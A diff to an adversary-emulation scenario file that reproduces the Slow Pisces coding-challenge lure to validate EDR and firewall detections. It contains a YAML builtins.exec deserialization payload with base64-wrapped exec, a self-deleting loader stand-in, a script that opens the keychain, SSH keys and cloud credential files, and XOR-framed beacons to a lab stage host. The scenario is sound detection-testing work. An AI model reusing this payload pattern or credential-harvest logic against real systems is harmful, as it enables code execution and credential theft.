@@ -1,14 +1,15 @@
 # Slow Pisces (DPRK; aka Jade Sleet, TraderTraitor), Unit 42 2025-04-14: a LinkedIn "recruiter"
-# hands a crypto developer a coding challenge (Stocks Pattern Analyzer). Run, the project fetches
+# hands a crypto developer a coding challenge (Stocks Pattern Analyzer) that fetches
 # en.stockslab.org/symbols/sp500; a validated target gets application/yaml, yaml.load() runs it,
 # ~/Public/__init__.py (RN Loader) beacons host info and self-deletes, then RN Stealer collects
-# the keychain, SSH keys and AWS/kube/gcloud configs (R0/R64/R128/R256). DC points at: EDR leg
-# (01-05) python3 child of the project, the ~/Public write, the self-deleting script, the
-# masqueraded dockerd, the credential-file opens, and DNS lookups of three published domains
-# (sent only via @${LAB_RESOLVER:-127.0.0.53}; no session opened, all HTTP goes to $STAGE_HOST);
-# NDR leg (06) NGFW EAL C2 records to the report's domain/IP pairs carrying the run host
-# (src_host). CR-MP-0027 fuses both legs. No cloud leg: the report shows the cloud configs
-# stolen, never used. The published SHA-256s are not carried: no file crossed a sensor.
+# keychain, SSH keys and AWS/kube/gcloud configs (R0/R64/R128/R256). DC points at: EDR leg
+# (01-05) the project python3 lineage, ~/Public write, self-deleting script, masqueraded dockerd,
+# credential-file opens and DNS lookups of three published domains (only via
+# @${LAB_RESOLVER:-127.0.0.53}); NDR leg (06) NGFW EAL records to the report's domain/IP pairs
+# carrying src_host. CR-MP-0027 fuses both. No cloud leg (configs stolen, never used in the report);
+# published SHA-256s not carried (no file crossed a sensor). Needs a `developer` account and `dig`
+# (dnsutils/bind-utils). All C2 is plain HTTP to $STAGE_HOST (report: HTTPS), poll 2 s (report: 20 s);
+# the fetched body is never executed, and absent credential paths get 0600 marker stand-ins.
 scenario_id: SIM-MP-027
 name: "Slow Pisces Coding-Challenge Lure to RN Loader / RN Stealer — Developer Workstation EDR + NGFW Stitch"
 version: "1.0"
@@ -166,45 +167,51 @@ steps:
       dig +short en.stockslab.org @${LAB_RESOLVER:-127.0.0.53}
       cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
       python3 - <<'PY'
-      import base64, os, urllib.request, urllib.error
+      import base64, hashlib, os, urllib.request, urllib.error
       stage = os.environ.get("STAGE_HOST", "127.0.0.1")
       port = os.environ.get("STAGE_PORT", "8080")
       url = "http://%s:%s/symbols/sp500" % (stage, port)
       cache = ".cache/sp500.yaml"
-      body, ctype = b"", ""
+      ctype = ""
       try:
           req = urllib.request.Request(url, headers={"Accept": "application/json, application/yaml"})
           with urllib.request.urlopen(req, timeout=5) as r:
-              body, ctype = r.read(), r.headers.get("Content-Type", "")
-          print("stage host replied with Content-Type %s" % ctype)
+              r.read()
+              ctype = r.headers.get("Content-Type", "")
+          print("stage host replied with Content-Type %s (body discarded, never executed)" % ctype)
       except (urllib.error.URLError, OSError) as exc:
-          print("stage host unreachable (%s): using the lab copy of the validated-target reply" % exc)
-      if "yaml" not in ctype:
-          # Validated targets get application/yaml instead of JSON. The lab reply is benign:
-          # it writes a self-deleting stand-in for RN Loader to ~/Public/__init__.py and runs it.
-          loader = (
-              "import getpass, json, os, platform, socket\n"
-              "os.remove(__file__)\n"
-              "info = {'user': getpass.getuser(), 'host': socket.gethostname(), 'os': platform.platform(), 'arch': platform.machine()}\n"
-              "os.makedirs('/tmp/cortexsim-mp-027', exist_ok=True)\n"
-              "open('/tmp/cortexsim-mp-027/rn-loader-sysinfo.json', 'w').write(json.dumps(info))\n"
-              "print('cortexsim-mp-027 rn-loader stand-in ran and removed', __file__)\n"
-          )
-          writer = (
-              "import base64, os, subprocess, sys\n"
-              "pub = os.path.join(os.path.expanduser('~'), 'Public')\n"
-              "if not os.path.isdir(pub):\n"
-              "    os.makedirs(pub)\n"
-              "    open(os.path.join(pub, '.cortexsim-mp-027-created'), 'w').close()\n"
-              "dst = os.path.join(pub, '__init__.py')\n"
-              "open(dst, 'w').write(base64.b64decode('%s').decode())\n"
-              "subprocess.run([sys.executable, dst], check=False)\n"
-          ) % base64.b64encode(loader.encode()).decode()
-          body = ("!!python/object/apply:builtins.exec\n- \"import base64; exec(base64.b64decode('%s'))\"\n"
-                  % base64.b64encode(writer.encode()).decode()).encode()
+          print("stage host unreachable (%s)" % exc)
+      # Whatever the stage host returned, the lab always caches its own benign stand-in for the
+      # validated-target application/yaml reply: it writes a self-deleting RN Loader stand-in to
+      # ~/Public/__init__.py and runs it. Step-02 executes it only if its digest matches.
+      loader = (
+          "import getpass, json, os, platform, socket\n"
+          "os.remove(__file__)\n"
+          "info = {'user': getpass.getuser(), 'host': socket.gethostname(), 'os': platform.platform(), 'arch': platform.machine()}\n"
+          "os.makedirs('/tmp/cortexsim-mp-027', exist_ok=True)\n"
+          "open('/tmp/cortexsim-mp-027/rn-loader-sysinfo.json', 'w').write(json.dumps(info))\n"
+          "print('cortexsim-mp-027 rn-loader stand-in ran and removed', __file__)\n"
+      )
+      writer = (
+          "import base64, os, subprocess, sys\n"
+          "pub = os.path.join(os.path.expanduser('~'), 'Public')\n"
+          "if not os.path.isdir(pub):\n"
+          "    os.makedirs(pub)\n"
+          "    open(os.path.join(pub, '.cortexsim-mp-027-created'), 'w').close()\n"
+          "dst = os.path.join(pub, '__init__.py')\n"
+          "if os.path.exists(dst) and 'cortexsim-mp-027' not in open(dst, errors='ignore').read():\n"
+          "    print('cortexsim-mp-027: %%s exists and is not ours; skipping the drop' %% dst)\n"
+          "else:\n"
+          "    open(dst, 'w').write(base64.b64decode('%s').decode())\n"
+          "    subprocess.run([sys.executable, dst], check=False)\n"
+      ) % base64.b64encode(loader.encode()).decode()
+      body = ("!!python/object/apply:builtins.exec\n- \"import base64; exec(base64.b64decode('%s'))\"\n"
+              % base64.b64encode(writer.encode()).decode()).encode()
       with open(cache, "wb") as fh:
           fh.write(body)
-      print("cortexsim-mp-027 lure project cached the /symbols/sp500 reply as %s" % cache)
+      with open(cache + ".sha256", "w") as fh:
+          fh.write(hashlib.sha256(body).hexdigest())
+      print("cortexsim-mp-027 lure project cached the lab stand-in /symbols/sp500 reply as %s" % cache)
       PY
     identity: developer
     mitre_technique: "T1204.002"
@@ -228,17 +235,26 @@ steps:
     command: |
       cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
       python3 - <<'PY'
-      data = open(".cache/sp500.yaml").read()
+      import hashlib
+      data = open(".cache/sp500.yaml", "rb").read()
+      pinned = open(".cache/sp500.yaml.sha256").read().strip()
+      if hashlib.sha256(data).hexdigest() != pinned:
+          raise SystemExit("cortexsim-mp-027: cached reply does not match the lab stand-in digest; refusing to load it")
+      data = data.decode()
+      TAG = "tag:yaml.org,2002:python/object/apply:builtins.exec"
       try:
           import yaml
-          # The lure branches on Content-Type and hands an application/yaml reply to the unsafe loader.
-          yaml.load(data, Loader=yaml.UnsafeLoader)
-          print("cortexsim-mp-027 PyYAML unsafe load applied !!python/object/apply:builtins.exec")
+          class LabLoader(yaml.SafeLoader):
+              pass
+          # SafeLoader plus exactly one constructor: the python/object/apply:builtins.exec tag the
+          # lure's unsafe yaml.load() honours, applied only to the digest-pinned lab stand-in.
+          LabLoader.add_constructor(TAG, lambda loader, node: exec(loader.construct_sequence(node)[0]))
+          yaml.load(data, Loader=LabLoader)
+          print("cortexsim-mp-027 YAML python/object/apply:builtins.exec applied to the pinned stand-in")
       except ImportError:
-          # PyYAML absent: apply the same python/object/apply tag the unsafe loader would.
           arg = data.split("\n", 1)[1].strip()[2:].strip().strip('"')
           exec(arg)
-          print("cortexsim-mp-027 PyYAML not installed: applied builtins.exec from the YAML tag directly")
+          print("cortexsim-mp-027 PyYAML not installed: applied builtins.exec from the pinned stand-in directly")
       PY
     identity: developer
     mitre_technique: "T1059.006"
@@ -369,7 +385,29 @@ steps:
       keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
       targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
                  ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
+      MARK = "cortexsim-mp-027"
+      def mkdirs_marked(path):
+          # Create missing directory levels, dropping a marker in each so cleanup removes only ours.
+          missing = []
+          while not os.path.isdir(path):
+              missing.append(path)
+              path = os.path.dirname(path)
+          for d in reversed(missing):
+              os.mkdir(d, 0o700)
+              open(os.path.join(d, ".cortexsim-mp-027-created"), "w").close()
+      # The identity harness runs this as a service account whose home usually has none of these
+      # files. Absent paths get a marker stand-in (0600) so the credential-access burst still happens.
+      seeded = []
+      for rel in [keychain, ".aws/credentials", ".kube/config", ".ssh/id_ed25519"]:
+          p = os.path.join(home, rel)
+          if not os.path.exists(p):
+              mkdirs_marked(os.path.dirname(p))
+              fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+              os.write(fd, MARK.encode() + b"\n")
+              os.close(fd)
+              seeded.append(p)
       targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
+      targets = list(dict.fromkeys(targets))
       apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
       manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
                   "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
@@ -380,7 +418,7 @@ steps:
               # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
               with open(p, "rb") as fh:
                   fh.read(1)
-              manifest["files"].append({"path": p, "size": os.path.getsize(p)})
+              manifest["files"].append({"path": p, "size": os.path.getsize(p), "stand_in": p in seeded})
           else:
               manifest["files"].append({"path": p, "present": False})
       blob = json.dumps(manifest).encode()
@@ -391,7 +429,7 @@ steps:
       c2("R64", xored)
       c2("R128", gzip.compress(xored))
       c2("R256")
-      print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked, names and sizes only" % len(manifest["files"]))
+      print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked (%d marker stand-ins seeded), names and sizes only" % (len(manifest["files"]), len(seeded)))
       PY
     platform_variants:
       macos: |
@@ -417,7 +455,29 @@ steps:
         keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
         targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
                    ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
+        MARK = "cortexsim-mp-027"
+        def mkdirs_marked(path):
+            # Create missing directory levels, dropping a marker in each so cleanup removes only ours.
+            missing = []
+            while not os.path.isdir(path):
+                missing.append(path)
+                path = os.path.dirname(path)
+            for d in reversed(missing):
+                os.mkdir(d, 0o700)
+                open(os.path.join(d, ".cortexsim-mp-027-created"), "w").close()
+        # The identity harness runs this as a service account whose home usually has none of these
+        # files. Absent paths get a marker stand-in (0600) so the credential-access burst still happens.
+        seeded = []
+        for rel in [keychain, ".aws/credentials", ".kube/config", ".ssh/id_ed25519"]:
+            p = os.path.join(home, rel)
+            if not os.path.exists(p):
+                mkdirs_marked(os.path.dirname(p))
+                fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+                os.write(fd, MARK.encode() + b"\n")
+                os.close(fd)
+                seeded.append(p)
         targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
+        targets = list(dict.fromkeys(targets))
         apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
         manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
                     "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
@@ -428,7 +488,7 @@ steps:
                 # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
                 with open(p, "rb") as fh:
                     fh.read(1)
-                manifest["files"].append({"path": p, "size": os.path.getsize(p)})
+                manifest["files"].append({"path": p, "size": os.path.getsize(p), "stand_in": p in seeded})
             else:
                 manifest["files"].append({"path": p, "present": False})
         blob = json.dumps(manifest).encode()
@@ -439,7 +499,7 @@ steps:
         c2("R64", xored)
         c2("R128", gzip.compress(xored))
         c2("R256")
-        print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked, names and sizes only" % len(manifest["files"]))
+        print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked (%d marker stand-ins seeded), names and sizes only" % (len(manifest["files"]), len(seeded)))
         PY
     identity: developer
     mitre_technique: "T1555.001"
@@ -451,12 +511,12 @@ steps:
     expected_detections:
       - plane: EDR
         type: BIOC
-        description: "python3 descended from the coding-challenge project opens the login keychain (login.keychain-db on macOS, login.keyring on Linux), ~/.ssh private keys and AWS, Kubernetes and gcloud credential files in one burst: the RN Stealer collection set."
+        description: "python3 descended from the coding-challenge project opens the login keychain (login.keychain-db on macOS, login.keyring on Linux), ~/.ssh private keys and AWS, Kubernetes and gcloud credential files in one burst: the RN Stealer collection set. Under the developer service account most of these are absent, so 0600 marker stand-ins (content cortexsim-mp-027) are seeded first for the keychain, .aws/credentials, .kube/config and .ssh/id_ed25519; real files are opened where they exist."
         ttp_ref: "TTP-2026-0186"
         detection_id: "bioc-mp-027-python-opens-keychain-ssh-key-and-cloud-cli-credential-files"
       - plane: EDR
         type: XQL
-        description: "Validation query: the same python3 causality chain opened three or more of the credential paths and wrote the XOR-framed manifest, on the run host, within the run window."
+        description: "Validation query: the same python3 causality chain opened three or more of the credential paths (real files, or the marker stand-ins seeded when absent) and wrote the XOR-framed manifest, on the run host, within the run window."
         ttp_ref: "TTP-2026-0186"
         detection_id: "xql-mp-027-rn-stealer-credential-file-access-on-the-run-host"
 
@@ -539,8 +599,8 @@ steps:
 
 cleanup:
   commands:
-    - "for f in /home/*/Public/__init__.py /Users/*/Public/__init__.py /root/Public/__init__.py; do grep -qs cortexsim-mp-027 \"$f\" && rm -f \"$f\"; done; true"
-    - "for d in /home/*/Public /Users/*/Public /root/Public; do [ -f \"$d/.cortexsim-mp-027-created\" ] && rm -f \"$d/.cortexsim-mp-027-created\" && rmdir \"$d\" 2>/dev/null; done; true"
+    - "for h in /home/* /Users/* /root; do for f in Public/__init__.py Library/Keychains/login.keychain-db .local/share/keyrings/login.keyring .aws/credentials .kube/config .ssh/id_ed25519; do grep -qs cortexsim-mp-027 \"$h/$f\" && rm -f \"$h/$f\"; done; done; true"
+    - "find /home /Users /root -maxdepth 6 -name .cortexsim-mp-027-created 2>/dev/null | sort -r | while read -r m; do rm -f \"$m\"; rmdir \"$(dirname \"$m\")\" 2>/dev/null; done; true"
     - "rm -rf /tmp/cortexsim-mp-027 /tmp/mp-027-ngfw-eal.yml"
     - "echo cortexsim-mp-027-cleanup-complete"
 
